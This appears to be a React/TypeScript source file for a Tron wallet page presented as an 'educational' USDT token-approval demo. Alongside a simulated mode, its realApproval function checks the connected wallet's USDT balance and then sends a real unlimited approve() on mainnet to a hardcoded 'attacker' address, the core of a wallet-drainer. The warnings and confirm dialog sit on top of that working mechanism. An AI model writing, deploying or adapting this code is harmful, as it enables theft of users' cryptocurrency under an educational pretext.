/* eslint-disable @typescript-eslint/no-unused-vars */
import React, { useEffect, useState } from "react";
import toast, { Toaster } from "react-hot-toast";

/* =========================
   TRC20 CONFIG
========================= */

// USDT TRC20 on Tron Mainnet
const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// Unlimited approval
const UNLIMITED =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

/* =========================
   TYPES
========================= */

interface WalletInfo {
  address: string;
  short: string;
  trx: string;
  usdt: string;
}

interface TronWebWindow extends Window {
  tronWeb?: any;
  tronLink?: any;
}

declare const window: TronWebWindow;

type LogType = "info" | "success" | "error" | "warning";

function App() {
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [tronWeb, setTronWeb] = useState<any>(null);
  const [token, setToken] = useState<any>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [step, setStep] = useState(1);

  /* =========================
     LOGGER (CORE)
  ========================= */
  const log = (msg: string, type: LogType = "info") => {
    console.log(`[${type.toUpperCase()}]`, msg);
    const timestamp = new Date().toLocaleTimeString();
    setLogs((prev) => [...prev, `[${timestamp}] ${msg}`]);

    switch (type) {
      case "success":
        toast.success(msg, { duration: 3000 });
        break;
      case "error":
        toast.error(msg, { duration: 4000 });
        break;
      case "warning":
        toast(msg, { icon: "⚠️", duration: 4000 });
        break;
      default:
        toast(msg, { duration: 3000 });
    }
  };

  const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

  /* =========================
     CHECK FOR TRON WEB
  ========================= */
  useEffect(() => {
    const checkTronWeb = () => {
      if (window.tronWeb || window.tronLink) {
        log("✅ Wallet extension detected", "success");
        initializeTronWeb();
        return true;
      }
      return false;
    };

    // Initial check
    if (!checkTronWeb()) {
      log("⚠️ Install TronLink or Trust Wallet extension", "warning");
    }

    // Check every 2 seconds for injection
    const interval = setInterval(checkTronWeb, 2000);
    
    // Cleanup
    return () => clearInterval(interval);
  }, []);

  /* =========================
     INITIALIZE TRON WEB
  ========================= */
  const initializeTronWeb = async () => {
    try {
      // Wait for tronWeb to be ready
      if (!window.tronWeb) {
        log("❌ tronWeb not available", "error");
        return;
      }

      // Check if ready
      if (!window.tronWeb.ready) {
        log("⏳ Waiting for wallet to be ready...", "info");
        return;
      }

      // Set tronWeb instance
      setTronWeb(window.tronWeb);
      
      // Initialize USDT contract
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      setToken(contract);
      log("✅ Contract initialized", "success");
      
    } catch (error) {
      log("❌ Failed to initialize contract", "error");
      console.error("Init error:", error);
    }
  };

  /* =========================
     CONNECT WALLET - SIMPLIFIED
  ========================= */
  const connectWallet = async () => {
    if (connecting || !window.tronWeb) {
      log("❌ Wallet not ready", "error");
      return;
    }

    try {
      setConnecting(true);
      log("🔗 Connecting to wallet...", "info");

      // Direct method for TronLink
      let address;
      if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        // Already connected
        address = window.tronWeb.defaultAddress.base58;
        log("🔄 Already connected to wallet", "success");
      } else {
        // Request connection
        const accounts = await window.tronWeb.request({
          method: 'tron_requestAccounts'
        });
        
        if (!accounts || accounts.length === 0) {
          throw new Error("No accounts found");
        }
        
        address = accounts[0];
        log("✅ Wallet connected successfully", "success");
      }

      // Get balances
      const trxBalance = await window.tronWeb.trx.getBalance(address);
      const trxFormatted = (trxBalance / 1e6).toFixed(2);

      // Get USDT balance if contract is ready
      let usdtBalance = "0.00";
      if (token) {
        try {
          const balance = await token.balanceOf(address).call();
          const decimals = await token.decimals().call();
          usdtBalance = (balance / Math.pow(10, decimals)).toFixed(2);
        } catch (e) {
          console.log("Could not fetch USDT balance:", e);
        }
      }

      setWallet({
        address,
        short: `${address.slice(0, 6)}...${address.slice(-4)}`,
        trx: trxFormatted,
        usdt: usdtBalance,
      });

      log(`📊 Wallet: ${address.slice(0, 6)}...${address.slice(-4)}`, "info");
      log(`💰 TRX Balance: ${trxFormatted}`, "success");
      
      if (usdtBalance !== "0.00") {
        log(`💰 USDT Balance: ${usdtBalance}`, "success");
      }

      setStep(2);

    } catch (err: any) {
      console.error("Connection error:", err);
      if (err?.message?.includes("rejected") || err?.code === 4001) {
        log("❌ Connection rejected by user", "error");
      } else if (err?.message?.includes("not installed")) {
        log("❌ Please install TronLink extension", "error");
      } else {
        log(`❌ Connection failed: ${err.message || "Unknown error"}`, "error");
      }
    } finally {
      setConnecting(false);
    }
  };

  /* =========================
     SIMULATE APPROVAL - TEST MODE
  ========================= */
  const simulateApproval = async () => {
    if (!wallet || !token) {
      log("❌ Wallet or token not ready", "error");
      return;
    }

    try {
      setLoading(true);
      
      // Show what would happen (educational)
      log("📚 EDUCATIONAL DEMO - NO REAL TRANSACTION", "warning");
      log("This shows what happens with unlimited approval", "info");
      
      await sleep(1000);
      
      // Generate a fake transaction ID for demo
      const fakeTxId = '0x' + Array.from({length: 64}, () => 
        Math.floor(Math.random() * 16).toString(16)
      ).join('');
      
      log(`📝 Demo: Would approve unlimited USDT`, "warning");
      log(`🔗 Demo TX: ${fakeTxId}`, "info");
      await sleep(1500);
      
      log("✅ Demo: Transaction would be confirmed", "success");
      log("⚠️ REAL DANGER: Attacker could drain ALL your USDT", "error");
      log("🔒 Safety: Always use limited approvals", "info");
      
      setStep(3);
      
    } catch (err: any) {
      log(`❌ Error in simulation: ${err.message}`, "error");
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     REAL APPROVAL (DANGEROUS - FOR DEMO ONLY)
  ========================= */
  const realApproval = async () => {
    if (!wallet || !token || !tronWeb) {
      log("❌ Wallet or token not ready", "error");
      return;
    }

    try {
      setLoading(true);
      
      // First check USDT balance
      log("🔍 Checking USDT balance...", "info");
      const balance = await token.balanceOf(wallet.address).call();
      const decimals = await token.decimals().call();
      const usdtBalance = (balance / Math.pow(10, decimals)).toFixed(2);
      
      if (parseFloat(usdtBalance) === 0) {
        log("❌ No USDT to approve", "error");
        setLoading(false);
        return;
      }
      
      log(`💰 Your USDT Balance: ${usdtBalance}`, "warning");
      await sleep(1000);
      
      // WARNING - This is dangerous!
      const attackerAddress = "TDgqGYjHc7KKcKjzh17m5w3VoM8RLBqJ72";
      
      const confirmed = window.confirm(
        `⚠️ ⚠️ ⚠️ EXTREME DANGER ⚠️ ⚠️ ⚠️\n\n` +
        `You are about to approve UNLIMITED USDT spending to:\n` +
        `${attackerAddress}\n\n` +
        `This will allow anyone with that address to transfer ALL your USDT at any time!\n\n` +
        `This is a REAL transaction on the Tron network.\n` +
        `Your funds could be stolen immediately.\n\n` +
        `Are you absolutely sure?`
      );
      
      if (!confirmed) {
        log("❌ Approval cancelled by user", "warning");
        setLoading(false);
        return;
      }
      
      log("📝 Sending REAL approval transaction...", "warning");
      
      // REAL TRANSACTION - DANGEROUS!
      const tx = await token
        .approve(attackerAddress, UNLIMITED)
        .send({
          feeLimit: 100_000_000,
          callValue: 0,
          shouldPollResponse: true,
        });
      
      log(`📨 REAL TX sent: ${tx.transaction.txID}`, "warning");
      log("⏳ Waiting for confirmation...", "info");
      
      // Wait for confirmation
      let confirmedTx = false;
      for (let i = 0; i < 20 && !confirmedTx; i++) {
        await sleep(2000);
        try {
          const info = await tronWeb.trx.getTransactionInfo(tx.transaction.txID);
          if (info?.id) {
            confirmedTx = true;
            log("✅ Transaction confirmed on blockchain", "success");
            log(`🔗 View: https://tronscan.org/#/transaction/${tx.transaction.txID}`, "info");
            log("🚨 WARNING: Your wallet is now vulnerable!", "error");
            log("💰 Revoke immediately on Tronscan", "warning");
          }
        } catch (e) {
          console.log("Checking confirmation...");
        }
      }
      
      if (!confirmedTx) {
        log("⚠️ Confirmation taking longer than expected", "warning");
      }
      
      setStep(3);
      
    } catch (err: any) {
      console.error("Approval error:", err);
      if (err?.message?.includes("insufficient energy")) {
        log("❌ Insufficient energy. You need TRX for transaction fees.", "error");
      } else if (err?.message?.includes("denied transaction")) {
        log("❌ Transaction denied by user", "error");
      } else if (err?.message?.includes("user rejected")) {
        log("❌ User rejected the transaction", "error");
      } else {
        log(`❌ Transaction failed: ${err.message || "Unknown error"}`, "error");
      }
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI COMPONENT
  ========================= */
  return (
    <>
      <Toaster 
        position="top-right"
        toastOptions={{
          style: {
            background: '#1f2937',
            color: '#fff',
            border: '1px solid #374151',
            maxWidth: '500px',
          },
        }}
      />

      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white p-4">
        <div className="max-w-md mx-auto">
          
          {/* Header */}
          <div className="text-center mb-8 pt-8">
            <h1 className="text-3xl font-bold mb-2">🛡️ Token Approval Demo</h1>
            <p className="text-gray-400">Educational tool - Understand approval risks</p>
          </div>

          {/* Status Card */}
          <div className="bg-gray-800/80 backdrop-blur-sm rounded-2xl border border-gray-700 p-6 mb-6">
            <div className="mb-6">
              <h2 className="text-xl font-bold mb-4">Wallet Status</h2>
              
              {wallet ? (
                <div className="space-y-3">
                  <div className="flex justify-between items-center p-3 bg-gray-900/50 rounded-lg">
                    <span className="text-gray-400">Address</span>
                    <span className="font-mono">{wallet.short}</span>
                  </div>
                  <div className="flex justify-between items-center p-3 bg-gray-900/50 rounded-lg">
                    <span className="text-gray-400">TRX Balance</span>
                    <span className="font-bold text-green-400">{wallet.trx} TRX</span>
                  </div>
                  <div className="flex justify-between items-center p-3 bg-gray-900/50 rounded-lg">
                    <span className="text-gray-400">USDT Balance</span>
                    <span className="font-bold text-blue-400">{wallet.usdt} USDT</span>
                  </div>
                </div>
              ) : (
                <div className="text-center py-8">
                  <div className="w-16 h-16 border-4 border-gray-700 border-t-blue-500 rounded-full animate-spin mx-auto mb-4"></div>
                  <p className="text-gray-400">Wallet not connected</p>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div className="space-y-4">
              {!wallet ? (
                <button
                  onClick={connectWallet}
                  disabled={connecting || !window.tronWeb}
                  className="w-full py-4 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {connecting ? (
                    <div className="flex items-center justify-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Connecting...
                    </div>
                  ) : window.tronWeb ? (
                    "🔗 Connect Wallet"
                  ) : (
                    "⬇️ Install TronLink First"
                  )}
                </button>
              ) : step === 2 ? (
                <div className="space-y-3">
                  <button
                    onClick={simulateApproval}
                    disabled={loading}
                    className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 rounded-xl font-bold text-lg transition-all duration-300"
                  >
                    {loading ? "🔄 Simulating..." : "🎓 Safe Demo (No TX)"}
                  </button>
                  
                  <div className="relative">
                    <div className="absolute inset-0 bg-gradient-to-r from-red-600 to-pink-600 rounded-xl blur opacity-50"></div>
                    <button
                      onClick={realApproval}
                      disabled={loading}
                      className="relative w-full py-4 bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50"
                    >
                      {loading ? "⚠️ Processing..." : "🚨 REAL Approval (Dangerous)"}
                    </button>
                  </div>
                  
                  <p className="text-xs text-gray-400 text-center">
                    ⚠️ "REAL Approval" sends actual blockchain transaction
                  </p>
                </div>
              ) : step === 3 ? (
                <div className="p-4 bg-gradient-to-r from-red-900/30 to-pink-900/30 border border-red-700 rounded-xl">
                  <h3 className="font-bold text-red-400 mb-2">⚠️ Important Notice</h3>
                  <p className="text-sm mb-4">
                    Unlimited approvals give complete control of your tokens to the approved address.
                    Always use limited amounts and revoke unused approvals.
                  </p>
                  <a
                    href="https://tronscan.org"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="block w-full py-3 bg-blue-600 hover:bg-blue-700 rounded-lg text-center font-medium"
                  >
                    🔍 Check/Revoke on Tronscan
                  </a>
                </div>
              ) : null}
            </div>
          </div>

          {/* Activity Log */}
          <div className="bg-gray-800/80 backdrop-blur-sm rounded-2xl border border-gray-700 p-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-bold">Activity Log</h2>
              {logs.length > 0 && (
                <button
                  onClick={() => setLogs([])}
                  className="text-sm text-gray-400 hover:text-white"
                >
                  Clear
                </button>
              )}
            </div>
            
            <div className="bg-black/40 rounded-lg p-4 h-64 overflow-y-auto">
              {logs.length === 0 ? (
                <div className="flex items-center justify-center h-full text-gray-500">
                  <div className="text-center">
                    <div className="text-4xl mb-2">📝</div>
                    <p>Activity will appear here</p>
                  </div>
                </div>
              ) : (
                <div className="space-y-2">
                  {logs.map((logMsg, index) => (
                    <div 
                      key={index} 
                      className="text-sm py-2 border-b border-gray-800 last:border-b-0"
                    >
                      {logMsg}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          {/* Instructions */}
          <div className="mt-6 text-center text-sm text-gray-500">
            <p className="mb-2">
              💡 This is an educational tool to understand token approval risks
            </p>
            <p>
              Always verify contracts before approving on{" "}
              <a 
                href="https://tronscan.org" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-blue-400 hover:text-blue-300"
              >
                Tronscan
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;